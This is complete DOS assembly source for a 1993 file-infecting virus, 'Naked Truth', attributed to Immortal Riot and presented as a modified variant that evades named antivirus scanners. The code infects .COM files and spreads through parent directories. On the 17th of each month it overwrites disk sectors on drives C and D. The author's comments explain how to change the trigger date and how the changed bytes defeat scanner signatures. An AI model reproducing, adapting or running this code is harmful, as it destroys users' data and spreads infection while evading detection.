; VirusName : Naked Truth
; Country   : Sweden
; Author    : The Unforiven / Immortal Riot
; Date	    : 17/09/1993
;
; This is a mutation of the virus Born on the Fourth of	July
; This was written by TBSI. Mcafee scan used to find it as the 
; "ash" virus. But I changed on a few bytes, and he's now tricked.
; Dr Alan Salomon "string" where placed at the beginning
; of the code, but now he's cheated too..So...enjoy!
;
; This is a non-overwriting com infector, it is not resident.
; It checks which day it is, and if it is the 17:ten the 
; virus will have a redeeming. A redeeming is very nice.
;
; This might not be the best mutation, but afterall, it
; cheats the most common virus scanners. This was born
; the seventeen of September 1993 (hate all date-names)
;
; Scan v108 can't find this, neither can S&S Toolkit 6.54,
; havn't tried with TBScan/F-Prot, but they will probably
; identify it as the "ash" virus.
;
; Regards : The Unforgiven / Immortal Riot


code segment word public 'code'			; 
assume cs:code,ds:code				; I assume that too :)   
org	100h					; 

main proc;edure					; Old pascal coder ?         


TITLE	Naked Truth				;Mutation Name...   
TOF:						;Top-Of-File
   		jmp	short begin		;Skip over program
  	       	NOP	                        ;Reserve 3rd byte
EOFMARK:	db	26			;Disable DOS's TYPE
		DB	0     ; <- S&S Toolkit "String-Cheater".

first_four:	nop				;First run copy only!
address:	int	20h			;First run copy only!
check:		nop				;First run copy only!
begin:	       	call	nextline		;Push BP onto stack
nextline:	pop	bp			;BP=location of Skip
		sub	bp,offset nextline	;BP=offset from 1st run

		mov	byte ptr [bp+offset infected],0
					    ;Reset infection count

		lea	si,[bp+offset first_four] ;Original first 4 bytes
	        mov	di,offset tof		  ;TOF never changes
	        mov	cx,4			  ;Lets copy 4 bytes
		cld				  ;Read left-to-right
		rep	movsb			  ;Copy the 4 bytes

		mov	ah,1Ah			  ;Set DTA address ...
		lea	dx,[bp+offset DTA]	  ; ... to *our* DTA
		int	21h			  ;Call DOS to set DTA

		mov	ah,4Eh			  ;Find First ASCIIZ
	    	lea	dx,[bp+offset immortal]	  ;DS:DX -} '*.COM',0
		lea	si,[bp+offset filename]	  ;Point to file
		push	dx			  ;Save DX
		jmp	short continue		  ;Continue...

return:
		mov	ah,1ah			  ;Set DTA address ...
		mov	dx,80h			  ; ... to default DTA
		int	21h			  ;Call DOS to set DTA
		xor	ax,ax			  ;AX= 0
		mov	bx,ax			  ;BX= 0
		mov	cx,ax			  ;CX= 0
		mov	dx,ax			  ;DX= 0
		mov	si,ax			  ;SI= 0
		mov	di,ax			  ;DI= 0
		mov	sp,0FFFEh		  ;SP= 0
		mov	bp,100h			  ;BP= 100h (RETurn addr)
		push	bp			  ; Put on stack
		mov	bp,ax			  ;BP= 0
		ret				  ;JMP to 100h

nextfile:	or	bx,bx			;Did we open the file?
		jz	skipclose		;No, so don't close it
		mov	ah,3Eh			;Close file
		int	21h			;Call DOS to close it
		xor	bx,bx			;Set BX back to 0
skipclose:	mov	ah,4Fh			;Find Next ASCIIZ

continue:	pop	dx			;Restore DX
		push	dx			;Re-save DX
		xor	cx,cx			;CX= 0
		xor	bx,bx
		int	21h			;Find First/Next
		jnc	skipjmp		
		jmp	NoneLeft		;Out of files

skipjmp:	mov	ax,3D02h		;open file
		mov	dx,si			;point to filespec
		int	21h			;Call DOS to open file
		jc	nextfile		;Next file if error

		mov	bx,ax			;get the handle
		mov	ah,3Fh			;Read from file
		mov	cx,4			;Read 4 bytes
		lea	dx,[bp+offset first_four]  ;Read in the first 4
		int	21h			   ;Call DOS to read

		cmp	byte ptr [bp+offset check],26	;Already infected?
		je	nextfile			;Yep, try again
		cmp	byte ptr [bp+offset first_four],77  ;
		je	nextfile			    ;

		mov	ax,4202h		;LSeek to EOF
		xor	cx,cx			;CX= 0
		xor	dx,dx			;DX= 0
		int	21h			;Call DOS to LSeek

		cmp	ax,0FD00h		;Longer than 63K?
		ja	nextfile		;Yep, try again...
		mov	[bp+offset addr],ax	;Save call location

		mov	ah,40h			  ;Write to file
		mov	cx,4			  ;Write 4 bytes
		lea	dx,[bp+offset first_four] ;Point to buffer
		int	21h			  ;Save the first 4 bytes

		mov	ah,40h			    ;Write to file
		mov	cx,offset eof-offset begin  ;Length of target code
		lea	dx,[bp+offset begin]	    ;Point to virus start
		int	21h			    ;Append the virus

	  	mov	ax,4200h			;LSeek to TOF
		xor	cx,cx				;CX= 0
		xor	dx,dx				;DX= 0
		int	21h				;Call DOS to LSeek

		mov	ax,[bp+offset addr]		;Retrieve location
		inc	ax				;Adjust location

		mov	[bp+offset address],ax		;address to call
		mov	byte ptr [bp+offset first_four],0E9h  ;JMP rel16 
		mov	byte ptr [bp+offset check],26	;EOFMARK

		mov	ah,40h				;Write to file
		mov	cx,4				;Write 4 bytes
		lea	dx,[bp+offset first_four]	;4 bytes are at DX
		int	21h				;Write to file

		inc	byte ptr [bp+offset infected]	;increment counter
		jmp	nextfile			;Any more?

NoneLeft:	cmp	byte ptr [bp+offset infected],2	;2 infected
		jae	TheEnd				;Party over!
		mov	di,100h				;DI= 100h
		cmp	word ptr [di],20CDh		;an INT 20h?
		je	daycheck			;je daycheck      
; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
; Here instead of "JE" to theend here, jump to Daycheck, and if the day
; isn't the 17:ten, just continue to theend, but if it is, have phun...
; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
	        lea	dx,[bp+offset riot]	;dot-dot method..
;	        MOV	DX,OFFSET RIOT		;shitty liner..      
		mov	ah,3Bh			;Set current directory
		int	21h			;CHDIR ..
		jc	TheEnd			;We're through!
		mov	ah,4Eh			;check for first com
		jmp	continue		;Start over in new dir
; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
; If you want to get a redeeming on some special month, just look at the
; call to daycheck at "nonleft" and the call to daycheck. Change the call
; to monthcheck, and "delete" the ";" on procedure monthcheck. But 
; remember, that makes, the virus much less destructive, and by that time,
; all scanners has probably added a new scan-string on this one. Now it will
; go off the 17:th every month. Feel free to modify this date as much you
; want to.
; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄÄ--ÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä-ÄÄ-
; monthcheck:		 ; check what month it is..   
;  	mov ah,2ah	 ;                         
;  	int 21h		 ; dos to your service..
;  	cmp dh,10  	 ; check if month 10..      
;	je  daycheck	 ; if yes jump to day check
; 	jmp theend	 ; otherwise jump to theend.
; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
DAYCHECK:		 ; Check what day it is..
  	mov ah,2ah	 ; 
 	int 21h		 ; Dos to your service..
 	cmp dl,17	 ; Check if it's the forbidden night..
 	je  redeeming	 ; If yes, have a great fuck..
 	jmp theend	 ; Otherwise jump to theend

REDEEMING:				; Havi'n such a great fuck..
	cli				; Cleaning all interrupts..>
	mov	ah,2			; Starting with drive C   
	cwd				; Starting it from 0     
	mov	cx,0100h		; Continue to 256
	int	026h			; Direct disk-write
	jmp	KARO 			; Jump For Joy..(J4J).. 

KARO: 					; Yet another..
	CLI				; No law-breakers here!
	MOV	AL,3			; Set to fry drive D
	MOV	CX,700			; Set to write 700 sectors
	MOV	DX,00			; Starting at sector 0
	MOV	DS,[DI+99]		; Put random crap in DS
	MOV	BX,[DI+55]		; More crap in BX
	CALL	REDEEMING		; Start it all over..

TheEnd:		jmp	return          ; Getting a gold medal ?            

Immortal:	db	'*.COM',0    	;File Specification
Riot:   	db	'..',0		;'Dot-Dot'     

MutationName:	db	" Naked Truth! "  
Sizefilling:	db	" Hi-Tech Assasins - Ready To Take On The World "
morefilling:	db	" // DEATH TO ALL - PEACE AT LAST // "
Copyleft:     	db	' The Unforgiven / Immortal Riot '        


; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
; None of this information is included in the virus's code.  It is only
; used during the search/infect routines and it is not necessary to pre-
; serve it in between calls to them.
; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄ--ÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄ----ÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-

EOF:						;End Of File..
DTA:		db	21 dup (?)		;internal search's data

attribute	db	?			;attribute
file_time	db	2 dup (?)		;file's time stamp
file_date	db	2 dup (?)		;file's date stamp
file_size	db	4 dup (?)		;file's size
filename	db	13 dup (?)		;filename

infected	db	?			;infection count

addr		dw	?			;Address

main endp;rocedure
code ends;egment

end main

; Greets goes out to : Raver, Metal Militia, Scavenger
; and all other	hi-tech assasins all over the world...